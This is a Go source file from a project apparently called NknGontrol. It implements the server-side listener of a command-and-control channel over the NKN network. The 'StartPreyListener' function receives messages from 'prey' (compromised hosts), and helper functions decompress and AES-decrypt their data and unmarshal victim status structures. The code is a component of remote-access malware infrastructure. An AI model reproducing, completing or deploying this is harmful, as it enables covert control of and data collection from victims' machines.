package main

import (
	"NknGontrol/module/cipher"
	"NknGontrol/module/compress"
	"NknGontrol/module/nkntransfer"
	"encoding/json"
	"fmt"

	"github.com/nknorg/nkn-sdk-go"
)

// StartPreyListener 函数传入需监听的id值
func StartPreyListener(listenid string) {

	listener, err := nkn.NewMultiClient(nkntransfer.Account, listenid, TransThreads, false, nil)
	if err != nil {
		fmt.Println(err)
	}
	//debug 1 line
	fmt.Println(listener.Address())
	<-listener.OnConnect.C
	//debug 1 line
	fmt.Println("Connection opened.")

	// 监听循环取出数据处理
	for {
		msg := <-listener.OnMessage.C
		Dealmsg(msg)
	}

}

//AesCompressListener 解压缩并解密
func AesCompressListener(b []byte) []byte {
	unzip, err := compress.UnZip(b)
	if err != nil {
		fmt.Println("接受数据无法解码", err)
	}
	data, _ := cipher.AesCbcDecrypt(unzip, []byte(Aeskey))
	return data
}

//Struct2Json Struct 转换
func Struct2Json(clientstruct interface{}) string {
	json, _ := json.Marshal(clientstruct) //字节流
	return string(json)
}

//Json2Struct 此处用到 结构体的方法与接受者
func (client *PreyStat) Json2Struct(dedata []byte) {
	jsontmp := string(dedata)
	json.Unmarshal([]byte(jsontmp), client)
}
